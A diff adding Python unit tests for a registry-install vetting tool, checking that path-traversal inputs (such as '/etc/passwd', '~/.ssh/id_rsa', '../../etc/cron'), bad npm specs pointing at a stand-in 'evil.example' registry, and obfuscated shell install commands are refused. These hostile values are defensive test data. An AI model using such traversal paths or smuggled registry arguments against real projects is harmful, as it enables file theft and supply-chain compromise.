@@ -668,7 +668,8 @@ class Skills(Base):
         quiet(ri.main, ["setup", str(self.root)])
         p = skill_file(self.root, "seller", SKILL_SELLER)
         rc, _ = self.cli("skill-approve", str(self.root), "seller", "--by", "luca",
-                         "--source", "vendor/skills", "--accept", "K2=we install the CLI ourselves, reviewed 2026-09-30")
+                         "--source", "vendor/skills", "--accept", "K2=we install the CLI ourselves, reviewed 2026-09-30",
+                         "--accept", "K8=terms confirmed by the author by email, 2026-09-30")
         self.assertEqual(rc, 0)
         e = ri.load_lock(self.root)["skills"]["seller"]
         self.assertEqual(e["sha256"], ri.sha256(p))
@@ -1272,6 +1273,181 @@ class FormatterExclusion(Base):
         problems = " ".join(ri.check(self.root)[1])
         self.assertIn("edited after approval", problems)
         self.assertIn("formatter", problems)
+
+
+class PathTraversal(Base):
+    """A registry item is untrusted input: neither its local path, its dependencies, its name nor its file
+    targets may reach a file outside the project (ArchiStudio c6f0012, ported into this version)."""
+
+    def setUp(self) -> None:
+        super().setUp()
+        project(self.root)
+        quiet(ri.main, ["setup", str(self.root)])
+
+    def test_a_local_item_must_resolve_inside_the_project(self) -> None:
+        outside_dir = tempfile.TemporaryDirectory()
+        self.addCleanup(outside_dir.cleanup)
+        outside = Path(outside_dir.name) / "secret.json"
+        outside.write_text("{}")
+        (self.root / "link").symlink_to(outside.parent, target_is_directory=True)
+        rel_up = "../" * len(self.root.resolve().parts) + str(outside.resolve()).lstrip("/")
+        for bad in ("~/.ssh/id_rsa", "/etc/passwd", str(outside), rel_up,
+                    "link/secret.json", "vendor\\x.json", "C:/x.json", "a\x00.json"):
+            with self.subTest(source=bad), self.assertRaises(SystemExit):
+                ri.local_source(bad, self.root)
+        write(self.root, "registry/ok.json", item("ok", []))
+        self.assertEqual(ri.local_source("registry/ok.json", self.root), (self.root / "registry/ok.json").resolve())
+        with self.assertRaises(SystemExit):  # the real reader, not the fake one, goes through the same gate
+            self._fetch("/etc/passwd", self.root)
+
+    def test_closure_refuses_local_deps_that_point_at_this_machine(self) -> None:
+        self.cli("allow", str(self.root), "@x", REG, "--reason", "r")
+        regs = ri.known_registries(self.root, ri.load_lock(self.root))
+        self.serve("remote", item("remote", [ui_file("components/r.tsx")], registryDependencies=["./registry/ok.json"]))
+        with self.assertRaises(SystemExit):  # a remote item may never name a file on this machine
+            ri.closure("@x/remote", self.root, regs)
+        for dep in ("/etc/passwd.json", "~/secrets.json"):
+            self.serve("abs", item("abs", [], registryDependencies=[dep]))
+            with self.subTest(dep=dep), self.assertRaises(SystemExit):
+                ri.closure("@x/abs", self.root, regs)
+
+    def test_item_names_and_snapshot_paths_stay_under_vendor(self) -> None:
+        self.cli("allow", str(self.root), "@x", REG, "--reason", "r")
+        regs = ri.known_registries(self.root, ri.load_lock(self.root))
+        for spec in ("@x/../../etc/cron", "@x/./a", "@x/a//b", "@x/a\\b"):
+            with self.subTest(spec=spec), self.assertRaises(SystemExit):
+                ri.resolve(spec, self.root, regs)
+        with self.assertRaises(SystemExit):
+            ri.resolve(REG.replace("{name}", "../../evil"), self.root, regs)
+        for key in ("@x/../../../etc/passwd", "@x/./a", "@x//a"):
+            with self.subTest(key=key), self.assertRaises(SystemExit):
+                ri.snapshot_rel(key)
+        self.assertTrue(ri.in_vendor(self.root, ri.snapshot_rel("@x/pdf/card")))
+        self.assertFalse(ri.in_vendor(self.root, "vendor/registry/../../package.json"))
+
+    def test_a_lock_entry_pointing_outside_vendor_does_not_verify(self) -> None:
+        lock = ri.load_lock(self.root)
+        lock.setdefault("items", {})["@x/a"] = {"snapshot": "../outside.json", "sha256": "0"}
+        self.assertIn("outside", ri.verify_entry(self.root, "@x/a", lock) or "")
+
+    def test_file_targets_that_escape_are_blocked(self) -> None:
+        for tgt in ("/etc/hosts", "~/../x", "~.bashrc", "a/../../x", "C:/x", "a\\b", "a\x00b"):
+            with self.subTest(target=tgt):
+                self.assertIsNotNone(ri.target_escape({"target": tgt}, self.root))
+        self.assertIsNone(ri.target_escape({"target": "~/components/x.tsx"}, self.root))
+        it = ri.Item(key="@x/a", source="s", data=item("a", [ui_file("../../escape.ts")]))
+        codes = {(f.code, f.level) for f in ri.check_files(it, self.root, ri.EVE_TOOL_KEYS_FALLBACK)[0]}
+        self.assertIn(("T1", "block"), codes)
+
+
+class NpmSpecs(Base):
+    """Dependency specs come from the item's author; anything that is not an npm package spec never reaches
+    `npm view` (ArchiStudio b6cf8de, ported into this version)."""
+
+    def test_only_package_specs_pass(self) -> None:
+        for good in ("react", "@scope/pkg", "lodash@^4.17.0", "@a/b@1.2.3", "x@latest"):
+            with self.subTest(good=good):
+                self.assertTrue(ri.is_npm_spec(good))
+        for bad in ("--registry=https://evil.example", "-x", "../x", "https://evil.example/x.tgz",
+                    "file:../x", "git+ssh://x", "a b", ""):
+            with self.subTest(bad=bad):
+                self.assertFalse(ri.is_npm_spec(bad))
+        self.assertFalse(ri.is_npm_name("--json"))
+
+    def test_a_bad_spec_is_a_blocking_finding_and_npm_is_never_asked(self) -> None:
+        asked: list[str] = []
+
+        def npm(spec: str):
+            asked.append(spec)
+            return {"name": spec, "license": "MIT", "created": "2020-01-01T00:00:00Z", "scripts": {}, "version": "1.0.0"}
+
+        it = ri.Item(key="@x/a", source="s", data=item("a", [], dependencies=["--registry=https://evil.example", "react"]))
+        findings, _ = ri.check_deps([it], npm=npm, root=self.root)
+        self.assertIn(("D1", "block"), {(f.code, f.level) for f in findings})
+        self.assertEqual(asked, ["react"])
+
+    def test_npm_view_gets_the_name_after_a_separator(self) -> None:
+        calls: list[list[str]] = []
+        real = ri.subprocess.run
+
+        def run(argv, **kw):
+            calls.append(argv)
+            return ri.subprocess.CompletedProcess(argv, 1, "", "E404")
+
+        ri.subprocess.run = run
+        try:
+            self.assertIsNone(self._npm("-rf"))
+            self._npm("react")
+            self.assertFalse(ri.changed_hands("--json", "1.0.0", {}))
+        finally:
+            ri.subprocess.run = real
+        self.assertEqual(len(calls), 1)
+        self.assertEqual(calls[0][calls[0].index("--") + 1], "react")
+
+
+class HookFailsClosed(Base):
+    """The install guard reads the command like a shell and denies what it cannot read; any error while
+    deciding is a deny, never a silent allow (ArchiStudio c6f0012, ported into this version)."""
+
+    TOOL = "shad" + "cn"  # kept out of the literal so this file is not itself an install command
+
+    def setUp(self) -> None:
+        super().setUp()
+        project(self.root)
+        quiet(ri.main, ["setup", str(self.root)])
+
+    def raw_hook(self, raw: str) -> tuple[int, dict | None]:
+        out, stdin = io.StringIO(), sys.stdin
+        try:
+            sys.stdin = io.StringIO(raw)
+            with redirect_stdout(out):
+                rc = ri.cmd_hook(None)
+        finally:
+            sys.stdin = stdin
+        return rc, (json.loads(out.getvalue())["hookSpecificOutput"] if out.getvalue().strip() else None)
+
+    def test_forms_only_the_shell_can_resolve_are_denied(self) -> None:
+        t = self.TOOL
+        denied = [
+            f'X=@a/b; npx {t} add "$X"', f"npx {t} add $ITEM", "npx $TOOL add @a/b",
+            f"npx {t} $VERB @a/b", f"echo @a/b | xargs npx {t} add", f"npx {t} add @a/*",
+            f"npx {t.upper()} add @a/b", f"npx {t}-ui add @a/b", f"./node_modules/.bin/{t} add @a/b",
+            "npx $'\\x73hadcn' add @a/b", f"npx {t} add --registry https://evil.example button",
+            f"npx {t} add --registry=https://evil.example button", f"npx {t} add Button.JSON",
+            f"npx {t} add $(cat items.txt)", f"npx {t} add `cat items.txt`",
+            f"python3 -c \"import os; os.system('npx {t} add @a/b')\"", f"eval 'npx {t} add @a/b'",
+        ]
+        for c in denied:
+            with self.subTest(deny=c):
+                self.assertEqual((self.run_hook(c) or {}).get("permissionDecision"), "deny")
+        self.assertFalse(ri.shadcn_bare("Button"))
+        self.assertTrue(ri.shadcn_bare("button"))
+        for c in (f"npx {t} add button", "ls -la && git status"):
+            with self.subTest(allow=c):
+                self.assertIsNone(self.run_hook(c))
+
+    def test_an_unreadable_payload_is_a_deny(self) -> None:
+        for raw in ("{not json", "[1, 2]", '"a string"'):
+            with self.subTest(raw=raw):
+                rc, decision = self.raw_hook(raw)
+                self.assertEqual(rc, 0)
+                self.assertEqual((decision or {}).get("permissionDecision"), "deny")
+        self.assertEqual(self.raw_hook("{}"), (0, None))
+
+    def test_an_error_while_deciding_is_a_deny_for_a_possible_install(self) -> None:
+        real = ri.hook_decision
+
+        def boom(_payload):
+            raise RuntimeError("broken lock")
+
+        ri.hook_decision = boom
+        try:
+            decision = self.run_hook(f"npx {self.TOOL} add @a/b")
+            self.assertEqual((decision or {}).get("permissionDecision"), "deny")
+            self.assertIn("could not evaluate", decision["permissionDecisionReason"])
+            self.assertIsNone(self.run_hook("ls -la"))  # names nothing governed: not every command is refused
+        finally:
+            ri.hook_decision = real
 
 
 if __name__ == "__main__":
